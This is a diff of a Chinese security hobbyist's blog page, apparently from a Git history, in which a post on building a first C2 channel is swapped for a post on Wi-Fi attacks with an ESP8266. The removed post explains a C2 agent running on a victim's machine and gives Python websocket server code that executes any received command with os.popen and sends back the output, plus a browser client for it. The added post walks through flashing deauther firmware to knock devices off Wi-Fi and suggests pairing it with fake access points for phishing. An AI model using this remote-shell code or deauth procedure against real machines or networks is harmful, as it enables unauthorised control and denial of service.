@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>第一个c2通信脚本 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="第一个c2通信脚本 | 九世的博客">
+  <title>ESP8266搞wifi初探 | 九世的博客</title>
+  <meta name="keywords" content=" 极客 ">
+  <meta name="description" content="ESP8266搞wifi初探 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1352,9 +1352,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-第一个c2通信脚本" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-ESP8266搞wifi初探" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">第一个c2通信脚本</h1>
+        <h1 class="article-title">ESP8266搞wifi初探</h1>
     
     <div class="article-meta">
         
@@ -1363,14 +1363,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">极客</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-12-14 18:13</time>
+        创建时间:<time class="date" title="更新时间: 2020-04-11 14:44:59">2020-04-11 14:18</time>
         
     </div>
     <div class="article-meta">
@@ -1392,7 +1392,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00前言"><span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01正文"><span class="toc-text">0x01正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1407,94 +1407,24 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>这几天在学校的实验室折腾c2通信。从一开始的不懂后面慢慢弄懂了，所谓的c2通信原理<br>是基于websocket上的操作。<br><img src="https://camo.githubusercontent.com/ed4690f37c4c7f83c5ba0ab669cc6d41ac9480f6/68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f732f327a6e6e6e373469637a646a6275732f6172636869746563747572652e6a70673f646c3d30" alt="68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f732f327a6e6e6e373469637a646a6275732f6172636869746563747572652e6a70673f646c3d30"></p>
-<h2 id="0x01正文"><a href="#0x01正文" class="headerlink" title="0x01正文"></a>0x01正文</h2><p><b>原理：</b></p>
-<pre><code>1.控制器运行Web / WebSocket服务器以及命令行界面，允许攻击者为代理输入命令
-2.代理程序在受害者的计算机上运行并执行从C2接收的任何指令，与处理与C2服务器的所有通信的浏览器进程交互
-3.通过COM接口控制的浏览器进程（Internet Explorer / Edge）通过WebScoket通道处理代理与C2服务器之间的所有通信
-</code></pre><p><b>连接过程</b></p>
-<pre><code>第一种：
-1.创建websocket然后调用js进行连接
-2.将创建好的websocket放入到受害者机子
-3.本地调用js连接然后执行命令由受害者端接收到进行命令执行在返回给攻击者
-
-第二种：
-1.在肉鸡上创建websocket
-2.然后受害者连接，然后攻击者访问肉鸡执行命令
-3.受害者接收到执行命令，然后返回给肉鸡
-</code></pre><p><b>代码</b><br>服务端</p>
-<pre><code>import asyncio
-import websockets
-import os
-import sys
-async def hello(websocket,path):
-    try:
-        while True:
-            name = await websocket.recv() #接收客户端的信息
-            zx=os.popen(name) #执行命令
-            await websocket.send(zx.read()) #返回给客户端
-    except Exception as r:
-        print(&#39;[-] Error {}&#39;.format(r))
-
-
-start_server=websockets.serve(hello,&#39;{}&#39;.format(sys.argv[1]),sys.argv[2]) #创建websocket
-asyncio.get_event_loop().run_until_complete(start_server) #异步
-asyncio.get_event_loop().run_forever()
-</code></pre><p>客户端</p>
-<pre><code>&lt;html&gt;
-&lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot;&gt;
-    &lt;title&gt;Web sockets test&lt;/title&gt;
-    &lt;script src=&quot;jquery-min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
-    &lt;script type=&quot;text/javascript&quot;&gt;
-        var ws;
-        function ToggleConnectionClicked() {          
-                try {
-                    ws = new WebSocket(&quot;ws://IP:PORT&quot;);//连接服务器 （连接websocket服务器）
-                    ws.onopen = function(event){alert(&quot;已经与服务器建立了连接\r\n当前连接状 （连接成功后触发的事件）态：&quot;+this.readyState);};
-                    ws.onmessage = function(event){alert(&quot;接收到服务器发送的数据：\r\n&quot;+event.data);}; （接收到数据触发的事件）
-                    ws.onclose = function(event){alert(&quot;已经与服务器断开连接\r\n当前连接状态：&quot;+this.readyState);};  //异常触发的事件
-                    ws.onerror = function(event){alert(&quot;WebSocket异常！&quot;);};
-                } catch (ex) {
-                    alert(ex.message);      
-                }
-        };
-
-        function SendData() {
-            try{
-                var content = document.getElementById(&quot;content&quot;).value;
-                if(content){
-                    ws.send(content);
-                }
-
-            }catch(ex){
-                alert(ex.message);
-            }
-        };
-
-        function seestate(){
-            alert(ws.readyState);
-        }
-
-    &lt;/script&gt;
-&lt;/head&gt;
-&lt;body&gt;
-   &lt;button id=&#39;ToggleConnection&#39; type=&quot;button&quot; onclick=&#39;ToggleConnectionClicked();&#39;&gt;连接服务器&lt;/button&gt;&lt;br /&gt;&lt;br /&gt;
-   &lt;textarea id=&quot;content&quot; &gt;&lt;/textarea&gt;
-    &lt;button id=&#39;ToggleConnection&#39; type=&quot;button&quot; onclick=&#39;SendData();&#39;&gt;发送我的名字：beston&lt;/button&gt;&lt;br /&gt;&lt;br /&gt;
-    &lt;button id=&#39;ToggleConnection&#39; type=&quot;button&quot; onclick=&#39;seestate();&#39;&gt;查看状态&lt;/button&gt;&lt;br /&gt;&lt;br /&gt;
-
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p><b>测试</b><br><img src="https://s1.ax1x.com/2018/12/14/FU1PvF.jpg" alt="FU1PvF.jpg"></p>
-<p><img src="https://s1.ax1x.com/2018/12/14/FU1Fu4.md.png" alt="FU1Fu4.md.png"></p>
-<p>在安有360的机子上进行测试：<br>视频:<a href="https://v.youku.com/v_show/id_XMzk2NDI2MjI0MA==.html?spm=a2hzp.8253869.0.0" target="_blank" rel="noopener">c2通信实现—其他—视频高清在线观看-优酷</a></p>
-<p><b>一些c2的项目</b><br><a href="https://github.com/nettitude/PoshC2" target="_blank" rel="noopener">GitHub - nettitude/PoshC2: Powershell C2 Server and Implants</a><br><a href="https://github.com/Arno0x/WSC2" target="_blank" rel="noopener">GitHub - Arno0x/WSC2: A WebSocket C2 Tool</a><br><b>参考文章</b><br><a href="https://arno0x0x.wordpress.com/2017/11/10/using-websockets-and-ie-edge-for-c2-communications/" target="_blank" rel="noopener">Using WebSockets and IE/Edge for C2 communications – arno0x0x</a></p>
-<p>github地址：<a href="https://github.com/422926799/python/tree/master/c2%E9%A1%B9%E7%9B%AE" target="_blank" rel="noopener">python/c2项目 at master · 422926799/python · GitHub</a></p>
-<p><b>后续开发的一些建议</b></p>
-<pre><code>1.实现以上说的方法
-2.加密传输
-</code></pre><p>转载请注明：转自422926799.github.io</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ESP8266和badusb一起买的，之前弄了badusb。ESP8266还没搞，今天搞了一下。还挺好玩，故此记录一下<br><img src="https://s1.ax1x.com/2020/04/11/GHB1vd.png" alt=""></p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>需要工具：</p>
+<pre><code>1.ESP8266
+2.数据线（线插ESP8266之后插入电脑没有COM接口的原因下面会说）
+</code></pre><p>当数据线插入ESP8266和电脑后，设备管理器没有出现新的COM接口有两个原因：<br>1.你用的这条线是充电线而不是数据线（刚刚踩完的坑）<br>2.没有安装驱动，驱动下载（根据自己的系统下载对应的驱动）（<a href="http://www.wch.cn/download/CH341SER_MAC_ZIP.html" target="_blank" rel="noopener">CH341SER_MAC.ZIP - 南京沁恒微电子股份有限公司</a>）</p>
+<p>成功连接会出现一个COM接口<br><img src="https://s1.ax1x.com/2020/04/11/GHD3JU.png" alt=""></p>
+<p>工具的那些来自于90sec帖子：<a href="https://forum.90sec.com/t/topic/917/7" target="_blank" rel="noopener">利用硬件，拿走你家wifi，没商量 - 技术文章 - 90Sec</a></p>
+<blockquote>
+<p>下载资源连接链接链接：<a href="https://pan.baidu.com/s/1eT-aenwt6BfG3yEMkp3mKw" target="_blank" rel="noopener">https://pan.baidu.com/s/1eT-aenwt6BfG3yEMkp3mKw</a> 6<br>提取码：w6uk</p>
+</blockquote>
+<p>打开收录工具点击ESP8266 DownloadTool，选择bin，然后根据下图设置。之后烧录，烧录成功如下图<br><img src="https://s1.ax1x.com/2020/04/11/GHDXT0.png" alt=""></p>
+<p>等待一会拔掉ESP8266重新接上去，会多出一个zhangguanzhang的SSID名<br><img src="https://s1.ax1x.com/2020/04/11/GHr10I.png" alt=""></p>
+<p>密码也是：zhangguanzhang</p>
+<p>连接上去后，访问192.168.4.1，点击扫描，出现如下图<br><img src="https://s1.ax1x.com/2020/04/11/GHrsA0.png" alt=""></p>
+<p>选中wifi（漏截图了，借图一用）<br><img src="https://s1.ax1x.com/2020/04/11/GHr74K.png" alt=""></p>
+<p>然后点击(攻击-&gt;deauth-&gt;开始)<br><img src="https://s1.ax1x.com/2020/04/11/GHrb9O.png" alt=""></p>
+<p>成功之后和mdk4攻击wifi的效果一样。wifi连不上，可以配合wifi伪造来钓鱼</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://forum.90sec.com/t/topic/917" target="_blank" rel="noopener">利用硬件，拿走你家wifi，没商量 - 技术文章 - 90Sec</a><br><a href="https://tieba.baidu.com/p/5613315808?red_tag=0244813551" target="_blank" rel="noopener">刚买的这块esp8266,用串口连接，蓝灯一闪而过，电脑连串口都检测不到，是什么原因，求助<em>esp8266吧</em>百度贴吧</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1504,12 +1434,12 @@ asyncio.get_event_loop().run_forever()
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>第一个c2通信脚本</p>
+    <p><span class="copy-title">文章标题:</span>ESP8266搞wifi初探</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-12-14, 18:13:48</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/d6f76024.html" title="第一个c2通信脚本">http://422926799.github.io/posts/d6f76024.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-04-11, 14:18:49</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-11, 14:44:59</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/d1398a09.html" title="ESP8266搞wifi初探">http://422926799.github.io/posts/d1398a09.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
